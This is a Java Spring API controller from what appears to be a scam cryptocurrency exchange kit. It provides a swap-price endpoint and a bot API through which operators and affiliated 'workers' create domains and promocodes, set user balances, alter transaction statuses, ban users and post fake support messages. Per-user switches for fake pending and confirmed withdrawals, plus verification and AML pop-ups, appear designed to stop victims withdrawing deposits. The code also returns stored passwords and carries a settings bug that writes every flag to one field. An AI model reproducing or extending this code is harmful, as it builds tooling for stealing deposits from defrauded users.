package me.yukitale.yellowexchange.exchange.controller.api;

import jakarta.servlet.http.HttpServletRequest;
import me.yukitale.yellowexchange.exchange.model.user.*;
import me.yukitale.yellowexchange.exchange.repository.user.*;
import me.yukitale.yellowexchange.exchange.service.CoinService;
import me.yukitale.yellowexchange.exchange.service.UserDetailsServiceImpl;
import me.yukitale.yellowexchange.exchange.service.UserService;
import me.yukitale.yellowexchange.panel.admin.model.AdminSettings;
import me.yukitale.yellowexchange.panel.admin.repository.AdminSettingsRepository;
import me.yukitale.yellowexchange.panel.common.data.WorkerTopStats;
import me.yukitale.yellowexchange.panel.common.model.Domain;
import me.yukitale.yellowexchange.panel.common.model.Promocode;
import me.yukitale.yellowexchange.panel.common.repository.DomainRepository;
import me.yukitale.yellowexchange.panel.common.repository.PromocodeRepository;
import me.yukitale.yellowexchange.panel.common.service.DomainService;
import me.yukitale.yellowexchange.panel.common.service.StatsService;
import me.yukitale.yellowexchange.panel.worker.model.Worker;
import me.yukitale.yellowexchange.panel.worker.repository.WorkerRepository;
import me.yukitale.yellowexchange.panel.worker.service.WorkerService;
import me.yukitale.yellowexchange.security.xss.utils.XSSUtils;
import me.yukitale.yellowexchange.utils.*;
import org.apache.commons.lang.RandomStringUtils;
import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.domain.PageRequest;
import org.springframework.data.domain.Pageable;
import org.springframework.http.ResponseEntity;
import org.springframework.security.core.Authentication;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

import java.util.*;

@Controller
@RequestMapping(value = "/api/exchange")
public class ExchangeApiController {

    @Autowired
    private AdminSettingsRepository adminSettingsRepository;

    @Autowired
    private PromocodeRepository promocodeRepository;

    @Autowired
    private UserDepositRepository userDepositRepository;

    @Autowired
    private WorkerRepository workerRepository;

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private UserTransactionRepository userTransactionRepository;

    @Autowired
    private UserSupportDialogRepository userSupportDialogRepository;

    @Autowired
    private UserSupportMessageRepository userSupportMessageRepository;

    @Autowired
    private UserSettingsRepository userSettingsRepository;

    @Autowired
    private DomainRepository domainRepository;

    @Autowired
    private EmailBanRepository emailBanRepository;

    @Autowired
    private CoinService coinService;

    @Autowired
    private UserService userService;

    @Autowired
    private WorkerService workerService;

    @Autowired
    private StatsService statsService;

    @Autowired
    private UserDetailsServiceImpl userDetailsService;

    @Autowired
    private DomainService domainService;

    //start swap
    @PostMapping(value = "swap")
    public ResponseEntity<String> swapController(Authentication authentication, @RequestHeader("host") String host, @RequestBody Map<String, Object> body) {
        if (!body.containsKey("action")) {
            return ResponseEntity.ok("user.api.error.null");
        }

        User user = userService.getUser(authentication);

        String action = (String) body.get("action");
        switch (action.toUpperCase()) {
            case "CALC_SWAP" -> {
                return calcSwap(user, host, body);
            }
            default -> {
                return ResponseEntity.ok("user.api.error.null");
            }
        }
    }

    private ResponseEntity<String> calcSwap(User user, String domain, Map<String, Object> body) {
        boolean changeCoin = DataUtil.getBoolean(body, "change_coin");

        String fromCoin = String.valueOf(body.get("from_coin"));
        String toCoin = String.valueOf(body.get("to_coin"));

        Worker worker = workerService.getUserWorker(user, domain);

        double fromPrice = coinService.getIfWorkerPrice(worker, fromCoin);
        double toPrice = coinService.getIfWorkerPrice(worker, toCoin);

        if (fromPrice <= 0 || toPrice <= 0) {
            return ResponseEntity.ok("user.api.error.null");
        }

        double minAmount = 1D / fromPrice;

        double amount = changeCoin ? minAmount : DataUtil.getDouble(body, "amount");
        if (amount < 0) {
            return ResponseEntity.ok("user.api.error.null");
        }

        double toAmount = fromPrice * amount / toPrice;

        Map<String, Object> answer = new HashMap<>();

        answer.put("to_amount", new MyDecimal(toAmount).toString(8));

        double price = fromPrice / toPrice;

        answer.put("min_amount", new MyDecimal(minAmount).toString(8));

        answer.put("price", new MyDecimal(price).toString(8));

        answer.put("price_change_percent", coinService.getWorkerPriceChangePercentFormatted(worker, fromCoin));

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    @PostMapping("/bot")
    public ResponseEntity<?> exchangeApi(@RequestParam(value = "api_key") String apiKey, @RequestParam(value = "action") String action, @RequestBody Map<String, Object> data) {
        Map<String, Object> answer = new HashMap<>();
        if (StringUtils.isBlank(apiKey)) {
            answer.put("error", "api_key");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        AdminSettings adminSettings = adminSettingsRepository.findFirst();
        if (StringUtils.isBlank(adminSettings.getApiKey())) {
            answer.put("error,", "api_key");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        if (!apiKey.equals(adminSettings.getApiKey())) {
            answer.put("error", "wrong_api_key");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        switch (action.toUpperCase()) {
            case "CREATE_DOMAIN" -> {
                return createDomain(answer, data);
            }
            case "CHANGE_BALANCE" -> {
                return changeBalance(answer, data);
            }
            case "GET_BALANCE" -> {
                return getBalance(answer, data);
            }
            case "CHANGE_BAN" -> {
                return changeBan(answer, data);
            }
            case "SEND_SUPPORT_MESSAGE" -> {
                return sendSupportMessage(answer, data);
            }
            case "CHANGE_SETTINGS" -> {
                return changeSettings(answer, data);
            }
            case "CREATE_RANDOM_WORKER" -> {
                return createRandomWorker(answer);
            }
            case "CREATE_PROMOCODE" -> {
                return createPromocode(answer, data);
            }
            case "DELETE_PROMOCODE" -> {
                return deletePromocode(answer, data);
            }
            case "GET_PROMOCODE", "GET_PROMOCODES" -> {
                return getPromocodes(answer, data);
            }
            case "GET_PROMOCODE_NAMES" -> {
                return getPromocodeNames(answer, data);
            }
            case "GET_PROMO_STATS" -> {
                return getPromoStats(answer, data);
            }
            case "GET_DEPOSITS" -> {
                return getDeposits(answer, data);
            }
            case "GET_STATS" -> {
                return getStats(answer, data);
            }
            case "GET_WORKER_INFO" -> {
                return getWorkerInfo(answer, data);
            }
            case "CHANGE_WORKER_INFO" -> {
                return changeWorkerInfo(answer, data);
            }
            case "CHANGE_TRANSACTION" -> {
                return changeTransaction(answer, data);
            }
            case "GET_TOP" -> {
                return getTop(answer, data);
            }
        }

        answer.put("error", "action_not_found");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> createRandomWorker(Map<String, Object> answer) {
        String email = RandomStringUtils.random(12, true, true).toLowerCase() + "@telegram.org";
        String password = RandomStringUtils.random(8, true, true);
        String ip = "127.0.0.1";
        String domainName = "127.0.0.1";
        String platform = "Telegram";

        User user = userService.createUser("", null, domainName, email, password, ip, platform, null, null, true);
        Worker worker = workerService.createWorker(user);

        answer.put("status", "ok");
        answer.put("email", email);
        answer.put("password", password);
        answer.put("user_id", user.getId());
        answer.put("worker_id", worker.getId());

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> createPromocode(Map<String, Object> answer, Map<String, Object> body) {
        String name = String.valueOf(body.get("name"));
        if (!name.matches("^[a-zA-Z0-9-_]{2,32}$")) {
            answer.put("error", "invalid_name");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        if (promocodeRepository.existsByNameIgnoreCase(name.toLowerCase())) {
            answer.put("error", "already_exists");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        String text = String.valueOf(body.get("text"));
        if (!DataValidator.isTextValided(text) || text.length() > 512) {
            answer.put("error", "invalid_text");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        String currency = String.valueOf(body.get("currency")).toUpperCase();
        if (!coinService.hasCoin(currency)) {
            answer.put("error", "currency_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        double sum = Double.parseDouble(String.valueOf(body.get("sum")));
        if (sum <= 0) {
            answer.put("error", "sum");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));
        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        if (promocodeRepository.countByWorkerId(worker.getId()) >= 50) {
            answer.put("error", "worker_promo_limit");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        Promocode promocode = new Promocode();
        promocode.setName(name);
        promocode.setText(text);
        promocode.setCoinSymbol(currency);
        promocode.setMinAmount(sum);
        promocode.setMaxAmount(sum);
        promocode.setBonusAmount(0);
        promocode.setWorker(worker);
        promocode.setCreated(new Date());

        promocodeRepository.save(promocode);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> deletePromocode(Map<String, Object> answer, Map<String, Object> body) {
        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));
        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        String name = String.valueOf(body.get("name"));
        Promocode promocode = promocodeRepository.findByNameIgnoreCaseAndWorkerId(name, worker.getId()).orElse(null);
        if (promocode == null) {
            answer.put("error", "promo_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        promocodeRepository.deleteById(promocode.getId());

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> getPromocodes(Map<String, Object> answer, Map<String, Object> body) {
        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));
        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        List<Promocode> promocodes = promocodeRepository.findByWorkerIdOrderByIdDesc(worker.getId());

        List<Map<String, Object>> promocodesList = new ArrayList<>();
        for (Promocode promocode : promocodes) {
            promocodesList.add(new HashMap<>() {{
                put("name", promocode.getName());
                put("currency", promocode.getCoinSymbol());
                put("sum", promocode.getMinAmount());
                put("created", StringUtil.formatDate(promocode.getCreated()));
                put("activations", promocode.getActivations());
                put("deposits", promocode.getDeposits());
                put("deposits_price", promocode.getDepositsPrice());
            }});
        }

        answer.put("promocodes", promocodesList);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> getPromocodeNames(Map<String, Object> answer, Map<String, Object> body) {
        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));
        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        List<Promocode> promocodes = promocodeRepository.findByWorkerIdOrderByIdDesc(worker.getId());

        List<Map<String, Object>> promocodesList = new ArrayList<>();
        for (Promocode promocode : promocodes) {
            promocodesList.add(new HashMap<>() {{
                put("id", promocode.getId());
                put("name", promocode.getName());
            }});
        }

        answer.put("promocodes", promocodesList);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> getPromoStats(Map<String, Object> answer, Map<String, Object> body) {
        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));
        long id = Long.parseLong(String.valueOf(body.get("id")));
        String type = (String) body.get("type");
        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        Promocode promocode = promocodeRepository.findByIdAndWorkerId(id, workerId).orElse(null);

        if (promocode == null) {
            answer.put("error", "promocode_not_found");
            return ResponseEntity.ok(answer);
        }

        Map<String, Map<String, Object>> countryStats = new LinkedHashMap<>();

        Map<String, Long> registrations;
        Map<String, Long> depositsCount;
        Map<String, Double> depositsPrices;
        Date startDate = null;
        if (type.equals("today")) {
            startDate = DateUtil.getTodayStartDate();
        } else if (type.equals("week")) {
            startDate = DateUtil.getWeekStartDate();
        } else if (type.equals("month")) {
            startDate = DateUtil.getMonthStartDate();
        }

        if (startDate == null) {
            registrations = userRepository.findRegistrationsByPromocodeAsMap(promocode.getName());
            depositsCount = userDepositRepository.findDepositsCountByPromocodeAsMap(promocode.getName());
            depositsPrices = userDepositRepository.findDepositsPriceByPromocodeAsMap(promocode.getName());
        } else {
            registrations = userRepository.findRegistrationsByPromocodeAsMap(promocode.getName(), startDate);
            depositsCount = userDepositRepository.findDepositsCountByPromocodeAsMap(promocode.getName(), startDate);
            depositsPrices = userDepositRepository.findDepositsPriceByPromocodeAsMap(promocode.getName(), startDate);
        }

        for (Map.Entry<String, Long> entry : registrations.entrySet()) {
            Map<String, Object> map = new HashMap<>();
            map.put("registrations", entry.getValue());
            countryStats.put(entry.getKey(), map);
        }

        for (Map.Entry<String, Long> entry : depositsCount.entrySet()) {
            Map<String, Object> map = countryStats.getOrDefault(entry.getKey(), new HashMap<>());
            map.put("deposits_count", entry.getValue());
        }

        for (Map.Entry<String, Double> entry : depositsPrices.entrySet()) {
            Map<String, Object> map = countryStats.getOrDefault(entry.getKey(), new HashMap<>());
            map.put("deposits_price", entry.getValue());
        }

        long activations = 0;
        long deposits = 0;
        double depositsPrice = 0;

        if (type.equals("today") || type.equals("week") || type.equals("month")) {
            for (Long value : registrations.values()) {
                activations += value;
            }
            for (Long value : depositsCount.values()) {
                deposits += value;
            }
            for (Double value : depositsPrices.values()) {
                depositsPrice += value;
            }
        } else {
            activations = promocode.getActivations();
            deposits = promocode.getDeposits();
            depositsPrice = promocode.getDepositsPrice();
        }

        answer.put("country_stats", countryStats);
        answer.put("name", promocode.getName());
        answer.put("currency", promocode.getCoinSymbol());
        answer.put("sum", promocode.getMinAmount());
        answer.put("created", StringUtil.formatDate(promocode.getCreated()));
        answer.put("activations", activations);
        answer.put("deposits", deposits);
        answer.put("deposits_price", depositsPrice);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> getDeposits(Map<String, Object> answer, Map<String, Object> body) {
        List<UserDeposit> deposits = userDepositRepository.findByCompletedAndBotReceivedOrderById(true, false);

        for (UserDeposit deposit : deposits) {
            deposit.setBotReceived(true);
            userDepositRepository.save(deposit);
        }

        List<Map<String, Object>> depositsList = new ArrayList<>();

        for (UserDeposit deposit : deposits) {
            depositsList.add(new HashMap<>() {{
                put("promocode", deposit.getUser().getPromocode());
                put("currency", deposit.getCoinType().name());
                put("amount", deposit.getAmount());
                put("price", deposit.getPrice());
                put("date", deposit.getDate().getTime());
                put("user", deposit.getUser().getEmail());
                put("deposit_id", deposit.getId());
                put("domain", deposit.getUser().getDomain());
                put("worker_id", deposit.getWorker() == null ? -1 : deposit.getWorker().getId());
            }});
        }

        answer.put("deposits", depositsList);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> getStats(Map<String, Object> answer, Map<String, Object> body) {
        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));

        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        answer.put("users", worker.getUsersCount());

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> getWorkerInfo(Map<String, Object> answer, Map<String, Object> body) {
        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));

        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        answer.put("email", worker.getUser().getEmail());
        answer.put("password", worker.getUser().getPassword());

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> changeWorkerInfo(Map<String, Object> answer, Map<String, Object> body) {
        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));

        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        String key = (String) body.get("key");
        String value = (String) body.get("value");

        User user = worker.getUser();
        if (key.equals("email")) {
            value = value.toLowerCase();
            if (!DataValidator.isEmailValided(value)) {
                answer.put("error", "email_not_valided");
                return ResponseEntity.ok(JsonUtil.writeJson(answer));
            }

            if (userRepository.existsByEmail(value)) {
                answer.put("error", "email_already_exists");
                return ResponseEntity.ok(JsonUtil.writeJson(answer));
            }

            userDetailsService.removeCache(user.getEmail());

            user.setEmail(value);

            userRepository.save(user);

            userDetailsService.removeCache(user.getEmail());
        } else {
            if (value.length() < 8 || value.length() > 64) {
                answer.put("error", "password_not_valided");
                return ResponseEntity.ok(JsonUtil.writeJson(answer));
            }

            user.setPassword(value);
            userRepository.save(user);

            userDetailsService.removeCache(user.getEmail());
        }

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> changeTransaction(Map<String, Object> answer, Map<String, Object> body) {
        long transactionId = Long.parseLong(String.valueOf(body.get("transaction_id")));
        UserTransaction userTransaction = userTransactionRepository.findById(transactionId).orElse(null);
        if (userTransaction == null) {
            answer.put("error", "transaction_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        String status = String.valueOf(body.get("status"));
        userTransaction.setStatus(UserTransaction.Status.valueOf(status.toUpperCase()));
        userTransactionRepository.save(userTransaction);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> createDomain(Map<String, Object> answer, Map<String, Object> body) {
        String domainName = String.valueOf(body.get("domain")).toLowerCase();

        if (domainRepository.findByName(domainName).isPresent()) {
            answer.put("error", "domain_already_exists");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        long workerId = body.containsKey("worker_id") ? Long.parseLong(String.valueOf(body.get("worker_id"))) : -1;

        Worker worker = workerId == -1 ? null : workerRepository.findById(workerId).orElse(null);

        domainService.createDomain(worker, domainName);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> changeBalance(Map<String, Object> answer, Map<String, Object> body) {
        long userId = Long.parseLong(String.valueOf(body.get("user_id")));
        User user = userRepository.findById(userId).orElse(null);
        if (user == null) {
            answer.put("error", "user_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        String coin = String.valueOf(body.get("coin"));
        if (!coinService.hasCoin(coin)) {
            answer.put("error", "coin_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        double balance = DataUtil.getDouble(body, "balance");
        if (balance < 0) {
            answer.put("error", "balance_negative");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        userService.setBalance(user.getId(), coin, balance);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> getBalance(Map<String, Object> answer, Map<String, Object> body) {
        long userId = Long.parseLong(String.valueOf(body.get("user_id")));
        User user = userRepository.findById(userId).orElse(null);
        if (user == null) {
            answer.put("error", "user_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        String coin = String.valueOf(body.get("coin"));
        if (!coinService.hasCoin(coin)) {
            answer.put("error", "coin_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        answer.put("balance", userService.getBalance(user, coin));

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> changeBan(Map<String, Object> answer, Map<String, Object> body) {
        String email = String.valueOf(body.get("email")).toLowerCase();
        if (!DataValidator.isEmailValided(email)) {
            answer.put("error", "email_not_valided");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        User user = userRepository.findByEmailWithRoles(email).orElse(null);
        if (user == null || user.getRoleType() != UserRole.UserRoleType.ROLE_USER) {
            answer.put("error", "user_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        boolean status = Boolean.parseBoolean(String.valueOf(body.get("status")));
        if (status) {
            emailBanRepository.deleteByEmail(email);
        } else if (!emailBanRepository.existsByEmail(email)) {
            EmailBan emailBan = new EmailBan();
            emailBan.setEmail(user.getEmail());
            emailBan.setUser(user);
            emailBan.setDate(new Date());

            emailBanRepository.save(emailBan);
        }

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> sendSupportMessage(Map<String, Object> answer, Map<String, Object> body) {
        long userId = Long.parseLong(String.valueOf(body.get("user_id")));
        User user = userRepository.findById(userId).orElse(null);
        if (user == null) {
            answer.put("error", "user_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        String message = String.valueOf(body.get("message"));
        if (StringUtils.isBlank(message)) {
            answer.put("error", "message_is_empty");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        if (message.length() > 2000) {
            answer.put("error", "message_too_large");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        message = XSSUtils.stripXSS(message);

        UserSupportMessage supportMessage = new UserSupportMessage(UserSupportMessage.Target.TO_USER, UserSupportMessage.Type.TEXT, message, false, true, user);

        createOrUpdateSupportDialog(supportMessage, user);

        userSupportMessageRepository.save(supportMessage);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> changeSettings(Map<String, Object> answer, Map<String, Object> body) {
        long userId = Long.parseLong(String.valueOf(body.get("user_id")));
        UserSettings userSettings = userSettingsRepository.findByUserId(userId).orElse(null);
        if (userSettings == null) {
            answer.put("error", "user_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        userSettings.setSwapEnabled((Boolean) body.getOrDefault("swap_enabled", userSettings.isSwapEnabled()));
        userSettings.setSwapEnabled((Boolean) body.getOrDefault("staking_enabled", userSettings.isStakingEnabled()));
        userSettings.setSwapEnabled((Boolean) body.getOrDefault("support_enabled", userSettings.isSupportEnabled()));
        userSettings.setSwapEnabled((Boolean) body.getOrDefault("transfer_enabled", userSettings.isTransferEnabled()));
        userSettings.setSwapEnabled((Boolean) body.getOrDefault("trading_enabled", userSettings.isTradingEnabled()));
        userSettings.setSwapEnabled((Boolean) body.getOrDefault("wallet_connect_enabled", userSettings.isWalletConnectEnabled()));
        userSettings.setSwapEnabled((Boolean) body.getOrDefault("fake_withdraw_pending_enabled", userSettings.isFakeWithdrawPending()));
        userSettings.setSwapEnabled((Boolean) body.getOrDefault("fake_withdraw_confirmed_enabled", userSettings.isFakeWithdrawConfirmed()));
        userSettings.setSwapEnabled((Boolean) body.getOrDefault("verification_modal_enabled", userSettings.isVerificationModal()));
        userSettings.setSwapEnabled((Boolean) body.getOrDefault("aml_modal_enabled", userSettings.isAmlModal()));

        userSettingsRepository.save(userSettings);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private void createOrUpdateSupportDialog(UserSupportMessage supportMessage, User user) {
        UserSupportDialog userSupportDialog = userSupportDialogRepository.findByUserId(user.getId()).orElse(null);
        if (userSupportDialog == null) {
            userSupportDialog = new UserSupportDialog();
        }

        userSupportDialog.setOnlyWelcome(false);
        userSupportDialog.setSupportUnviewedMessages(userSupportDialog.getSupportUnviewedMessages() + 1);
        userSupportDialog.setTotalMessages(userSupportDialog.getTotalMessages() + 1);
        userSupportDialog.setLastMessageDate(supportMessage.getCreated());
        userSupportDialog.setUser(user);

        userSupportDialogRepository.save(userSupportDialog);
    }

    private ResponseEntity<?> getTop(Map<String, Object> answer, Map<String, Object> body) {
        String typeString = (String) body.get("type");

        WorkerTopStats.Type type = WorkerTopStats.Type.valueOf(typeString.toUpperCase());

        List<WorkerTopStats> topStatsList = statsService.getAllWorkerStats(type);

        List<Map<String, Object>> list = new ArrayList<>();

        for (int i = 0; i < Math.min(10, topStatsList.size()); i++) {
            WorkerTopStats topStats = topStatsList.get(i);

            Map<String, Object> map = new HashMap<>();
            map.put("worker_id", topStats.getWorker().getId());
            map.put("username", topStats.getWorker().getUser().getEmail());
            map.put("deposits_count", topStats.getDepositsCount());
            map.put("deposits_price", topStats.getDepositsPrice().getValue());
            map.put("users_count", topStats.getUsersCount());

            list.add(map);
        }

        answer.put("top", list);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }
    //end swap
}
